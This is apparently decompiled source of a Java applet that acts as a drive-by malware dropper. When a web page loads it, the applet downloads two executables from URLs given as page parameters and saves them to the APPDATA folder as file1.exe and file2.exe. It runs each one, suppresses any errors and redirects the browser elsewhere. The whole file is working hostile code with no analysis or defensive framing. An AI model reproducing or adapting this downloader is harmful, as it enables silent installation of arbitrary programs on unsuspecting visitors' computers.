import java.io.InputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Java extends Applet
{
    @Override
    public void init() {
        final String getenv = System.getenv("APPDATA");
        final String s = "file1.exe";
        final String s2 = "file2.exe";
        final String parameter = this.getParameter("redir");
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(getenv + s);
            final Runtime runtime = Runtime.getRuntime();
            final InputStream inputStream = new URL(this.getParameter("file1")).openConnection().getInputStream();
            final byte[] array = new byte[1024];
            int read;
            while ((read = inputStream.read(array, 0, array.length)) != -1) {
                fileOutputStream.write(array, 0, read);
            }
            inputStream.close();
            fileOutputStream.close();
            runtime.exec(getenv + s);
            final FileOutputStream fileOutputStream2 = new FileOutputStream(getenv + s2);
            final Runtime runtime2 = Runtime.getRuntime();
            final InputStream inputStream2 = new URL(this.getParameter("file2")).openConnection().getInputStream();
            final byte[] array2 = new byte[1024];
            int read2;
            while ((read2 = inputStream2.read(array2, 0, array2.length)) != -1) {
                fileOutputStream2.write(array2, 0, read2);
            }
            inputStream2.close();
            fileOutputStream2.close();
            runtime2.exec(getenv + s2);
            this.getAppletContext().showDocument(new URL(parameter));
        }
        catch (Exception ex) {}
    }
}
